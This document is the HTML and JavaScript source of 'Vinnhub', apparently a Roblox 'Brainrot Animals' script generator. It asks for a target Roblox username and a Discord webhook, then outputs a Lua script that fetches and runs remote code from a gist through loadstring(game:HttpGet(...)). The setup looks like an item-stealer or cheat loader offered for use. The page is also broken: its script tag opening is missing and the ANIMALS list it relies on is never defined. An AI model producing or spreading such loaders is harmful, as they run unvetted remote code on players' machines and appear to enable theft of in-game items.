<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Vinnhub | Dashboard</title>
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  :root {
    --bg: #080a0e;
    --surface: #0f1117;
    --panel: #13161f;
    --border: #1c2130;
    --accent: #00e5ff;
    --purple: #a78bfa;
    --discord: #5865f2;
    --green: #10b981;
    --danger: #f43f5e;
    --text: #dde4f0;
    --muted: #4a5568;
  }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Rajdhani', sans-serif;
    min-height: 100vh;
    overflow-x: hidden;
  }

  body::before {
    content: '';
    position: fixed;
    inset: 0;
    background-image:
      linear-gradient(rgba(0,229,255,0.025) 1px, transparent 1px),
      linear-gradient(90deg, rgba(0,229,255,0.025) 1px, transparent 1px);
    background-size: 44px 44px;
    pointer-events: none;
    z-index: 0;
  }

  .wrap {
    position: relative;
    z-index: 1;
    max-width: 920px;
    margin: 0 auto;
    padding: 2rem 1.5rem 6rem;
  }

  /* ── Navigation Bar ── */
  .nav-bar {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 1.2rem;
    background: rgba(15, 17, 23, 0.6);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 0.6rem 1.2rem;
    margin-bottom: 2.5rem;
    backdrop-filter: blur(10px);
    animation: fadeDown .5s ease both;
  }

  .nav-item {
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.75rem;
    color: var(--muted);
    text-transform: uppercase;
    letter-spacing: 0.1em;
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 0.4rem;
    transition: all 0.2s ease;
  }

  .nav-item:hover, .nav-item.active { color: var(--purple); }
  .nav-item.active {
    background: rgba(167, 139, 250, 0.1);
    padding: 0.3rem 0.7rem;
    border-radius: 6px;
    border: 1px solid rgba(167, 139, 250, 0.2);
  }

  /* ── Header ── */
  header {
    text-align: center;
    margin-bottom: 3rem;
    animation: fadeDown .55s ease both;
  }

  .live-badge {
    display: inline-flex;
    align-items: center;
    gap: 0.5rem;
    background: rgba(167, 139, 250, 0.05);
    border: 1px solid rgba(167, 139, 250, 0.15);
    padding: 0.3rem 1rem;
    border-radius: 20px;
    font-size: 0.65rem;
    color: var(--purple);
    margin-bottom: 1.2rem;
    text-transform: uppercase;
    font-family: 'Share Tech Mono', monospace;
  }

  h1 {
    font-size: clamp(1.9rem, 4.5vw, 3rem);
    font-weight: 700;
    letter-spacing: .1em;
    text-transform: uppercase;
    background: linear-gradient(130deg, var(--accent) 0%, var(--purple) 100%);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    line-height: 1;
  }

  .tagline {
    font-family: 'Share Tech Mono', monospace;
    font-size: .78rem;
    letter-spacing: .18em;
    text-transform: uppercase;
    color: var(--muted);
    margin-top: .4rem;
  }

  /* ── Panel base ── */
  .panel {
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: 12px;
    overflow: hidden;
    margin-bottom: 1.2rem;
    animation: fadeUp .5s ease both;
  }

  .ph {
    display: flex;
    align-items: center;
    gap: .6rem;
    padding: .75rem 1.25rem;
    background: var(--surface);
    border-bottom: 1px solid var(--border);
  }

  .dot {
    width: 7px; height: 7px;
    border-radius: 50%;
    flex-shrink: 0;
    animation: blink 2.2s infinite;
  }

  .dot-cyan   { background: var(--accent);   box-shadow: 0 0 7px var(--accent); }
  .dot-purple { background: var(--purple);   box-shadow: 0 0 7px var(--purple); animation-delay:.4s; }
  .dot-green  { background: var(--green);    box-shadow: 0 0 7px var(--green);  animation-delay:1.2s; }

  .ph-title {
    font-family: 'Share Tech Mono', monospace;
    font-size: .72rem;
    text-transform: uppercase;
    letter-spacing: .15em;
    color: var(--muted);
  }

  .pb { padding: 1.25rem; }

  /* ── Search & Lists ── */
  .search-row { display: flex; gap: .6rem; margin-bottom: .75rem; }
  .search-input {
    flex: 1; background: var(--bg); border: 1px solid var(--border); border-radius: 7px;
    padding: .55rem .85rem; color: var(--text); font-family: 'Share Tech Mono', monospace;
    font-size: .82rem; outline: none; transition: border-color .2s;
  }
  .search-input:focus { border-color: var(--accent); }

  .animal-list {
    background: var(--bg); border: 1px solid var(--border); border-radius: 8px;
    height: 200px; overflow-y: auto; scrollbar-width: thin;
  }

  .a-item {
    display: flex; align-items: center; gap: .65rem; padding: .48rem .9rem;
    cursor: pointer; border-bottom: 1px solid rgba(255,255,255,.025); transition: background .12s;
  }
  .a-item:hover { background: rgba(0,229,255,.05); }
  .a-item.on    { background: rgba(0,229,255,.09); }

  /* ── Form Elements ── */
  .txt {
    width: 100%; background: var(--bg); border: 1px solid var(--border); border-radius: 8px;
    padding: .72rem 1rem; color: var(--text); font-family: 'Share Tech Mono', monospace;
    font-size: .88rem; outline: none; margin-bottom: 0.5rem;
  }
  .lbl {
    display: block; font-family: 'Share Tech Mono', monospace; font-size: .68rem;
    text-transform: uppercase; letter-spacing: .13em; color: var(--muted); margin-bottom: .45rem;
  }
  .btn-sm {
    padding: .5rem .9rem; background: rgba(0,229,255,.06); border: 1px solid rgba(0,229,255,.2);
    border-radius: 7px; color: var(--accent); font-family: 'Share Tech Mono', monospace;
    font-size: .68rem; cursor: pointer;
  }
  .btn-gen {
    display: block; width: 100%; padding: .92rem;
    background: linear-gradient(130deg, var(--accent) 0%, #38bdf8 100%);
    border: none; border-radius: 10px; color: #040608; font-family: 'Rajdhani', sans-serif;
    font-size: 1.1rem; font-weight: 700; letter-spacing: .14em; text-transform: uppercase;
    cursor: pointer; transition: all .2s; box-shadow: 0 0 26px rgba(0,229,255,.16);
    margin-bottom: 1.2rem;
  }

  /* ── Logs ── */
  .log-entry {
    font-family: 'Share Tech Mono', monospace; font-size: 0.75rem; padding: 0.6rem;
    border-bottom: 1px solid rgba(28, 33, 48, 0.5); display: flex; justify-content: space-between;
    animation: fadeDown 0.3s ease-out;
  }
  .log-user { color: var(--accent); }
  .log-time { color: var(--muted); font-size: 0.65rem; }

  .code-block {
    background: var(--bg); border: 1px solid var(--border); border-radius: 8px;
    padding: 1rem 1.2rem; font-family: 'Share Tech Mono', monospace; font-size: .79rem;
    line-height: 1.8; color: #7ecfe8; min-height: 100px; white-space: pre; overflow-x: auto;
  }

  @keyframes fadeDown { from { opacity:0; transform: translateY(-10px); } to { opacity:1; transform: none; } }
  @keyframes fadeUp   { from { opacity:0; transform: translateY(10px);  } to { opacity:1; transform: none; } }
  @keyframes blink    { 0%,100% { opacity:1; } 50% { opacity:.3; } }
</style>
</head>
<body>

<div class="wrap">
  <nav class="nav-bar">
    <div class="nav-item active"><span>⚡</span> Generator</div>
    <div class="nav-item"><span>📊</span> Top</div>
    <div class="nav-item"><span>🌐</span> Global Logs</div>
    <div class="nav-item"><span>💬</span> Chat</div>
    <div class="nav-item"><span>🛡️</span> Ranks</div>
  </nav>

  <header>
    <div class="live-badge">
      <div class="dot dot-purple" style="width:6px; height:6px;"></div>
      LIVE • Script Generator
    </div>
    <div class="logo-row"><h1>Vinnhub</h1></div>
    <p class="tagline">Roblox • Brainrot Animals • Script Generator</p>
  </header>

  <div class="panel">
    <div class="ph"><div class="dot dot-purple"></div><span class="ph-title">Recent Activity</span></div>
    <div class="pb" id="logFeed" style="max-height: 160px; overflow-y: hidden;">
      <div class="log-entry" style="color: var(--muted); justify-content: center;">No recent generations...</div>
    </div>
  </div>

  <div class="panel">
    <div class="ph"><div class="dot dot-cyan"></div><span class="ph-title">Select Brainrot Animals</span></div>
    <div class="pb">
      <div class="search-row">
        <input class="search-input" id="searchBox" type="text" placeholder="Search..." oninput="filterList()">
        <button class="btn-sm" onclick="selectAll()">All</button>
        <button class="btn-sm" onclick="clearAll()" style="color:var(--danger)">Clear</button>
      </div>
      <div class="animal-list" id="animalList"></div>
      <div style="margin-top:0.5rem; font-family:'Share Tech Mono'; font-size:0.7rem; color:var(--muted)">
        <span id="selNum" style="color:var(--accent)">0</span> Selected
      </div>
    </div>
  </div>

  <div class="panel">
    <div class="ph"><div class="dot dot-cyan"></div><span class="ph-title">Configuration</span></div>
    <div class="pb">
      <label class="lbl">Roblox Username</label>
      <input class="txt" id="usernameInput" type="text" placeholder="Builderman" autocomplete="off">
      <label class="lbl">Discord Webhook</label>
      <input class="txt" id="webhookInput" type="text" placeholder="https://discord.com/api/webhooks/..." autocomplete="off">
    </div>
  </div>

  <button class="btn-gen" onclick="generate()">⚡ Generate Script</button>

  <div class="panel">
    <div class="ph"><div class="dot dot-green"></div><span class="ph-title">Generated Script</span></div>
    <div class="pb">
      <div class="code-block" id="outputBlock">-- Output will appear here...</div>
    </div>
  </div>
</div>

let selected = new Set();

function renderList(filter) {
  const q = (filter || '').toLowerCase();
  const list = document.getElementById('animalList');
  list.innerHTML = '';
  ANIMALS.forEach(name => {
    if (q && !name.toLowerCase().includes(q)) return;
    const row = document.createElement('div');
    row.className = 'a-item' + (selected.has(name) ? ' on' : '');
    const cb = document.createElement('input');
    cb.type = 'checkbox';
    cb.checked = selected.has(name);
    cb.style.accentColor = 'var(--accent)';
    const lbl = document.createElement('span');
    lbl.style.fontSize = '0.85rem';
    lbl.textContent = name;
    row.appendChild(cb);
    row.appendChild(lbl);
    row.onclick = () => toggle(name);
    list.appendChild(row);
  });
  document.getElementById('selNum').textContent = selected.size;
}

function toggle(name) {
  selected.has(name) ? selected.delete(name) : selected.add(name);
  renderList(document.getElementById('searchBox').value);
}

function filterList() { renderList(document.getElementById('searchBox').value); }
function selectAll()  { ANIMALS.forEach(n => selected.add(n)); renderList(); }
function clearAll()   { selected.clear(); renderList(); }

function addLog(user, count) {
  const feed = document.getElementById('logFeed');
  if (feed.innerText.includes("No recent")) feed.innerHTML = "";
  const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
  const entry = document.createElement('div');
  entry.className = 'log-entry';
  entry.innerHTML = `<span><span class="log-user">${user}</span> generated script (${count} animals)</span><span class="log-time">${time}</span>`;
  feed.prepend(entry);
  if (feed.children.length > 4) feed.removeChild(feed.lastChild);
}

function generate() {
  const username = document.getElementById('usernameInput').value.trim();
  const webhook  = document.getElementById('webhookInput').value.trim();
  const out      = document.getElementById('outputBlock');
  if (!username || !webhook) { alert("Fill all fields!"); return; }

  addLog(username, selected.size);

  const brainrotLines = [...selected].map(n => `    ["${n}"] = true,`).join('\n');
  const script = `getgenv().WEBHOOK_URL = "${webhook}"\ngetgenv().TARGET_USERNAME = "${username}"\ngetgenv().WANTED_BRAINROTS = {\n${brainrotLines}\n}\nloadstring(game:HttpGet("https://gist.githubusercontent.com/HopeThisWorkPpp/c2788cdfd3c62296b8721e721f66b396/raw/main.lua"))()`;
  out.textContent = script;
}

renderList();
</script>
